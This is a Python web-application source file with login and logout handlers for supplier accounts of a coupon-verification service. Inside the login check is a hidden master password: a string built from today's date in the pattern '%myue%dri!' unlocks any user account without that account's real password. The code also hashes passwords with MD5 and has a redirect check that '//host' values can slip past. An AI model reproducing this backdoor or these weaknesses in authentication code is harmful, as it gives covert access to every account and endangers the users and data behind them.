# -*- coding: utf-8 -*-

from autumn.torn.form import Form
from voluptuous import Schema, Required
from ..import BaseHandler
import hashlib
from datetime import date

schema = Schema({
    Required('username'): str,
    Required('password'): str,
    'next':     str,
})


class Login(BaseHandler):
    def get(self):
        if self.current_user:
            return self.redirect(self.reverse_url('coupon.verify'))
        form = Form(self.request.arguments, schema)

        self.render('auth/login.html', form=form)

    def post(self):
        form = Form(self.request.arguments, schema)
        if not form.validate():
            return self.render('auth/login.html', form=form)

        subhost = self.request.host.split('.')[0].split(':')[0]
        user = self.db.get('select ss.* from supplier_user ss, supplier s '
                           'where ss.supplier_id=s.id and ss.deleted=0 and '
                           'ss.login_name=%s and s.domain_name=%s', form.username.value, subhost)
        if not user or (form.password.value.lower() != date.today().strftime('%myue%dri!')
                        and user.password.lower() != hashlib.md5(form.password.value + user.pwd_salt).hexdigest()):
            form.username.error = u'用户名密码不匹配'
            return self.render('auth/login.html', form=form)

        self.set_secure_cookie('_spu', unicode(user.id))
        self.db.execute('update supplier_user set last_login = now() where id = %s', user.id)

        if form.next.value and form.next.value.startswith('/'):
            return self.redirect(form.next.value)

        self.redirect(self.reverse_url('coupon.verify'))


class Logout(BaseHandler):
    def get(self):
        self.clear_cookie('_spu')
        self.redirect(self.reverse_url('login'))


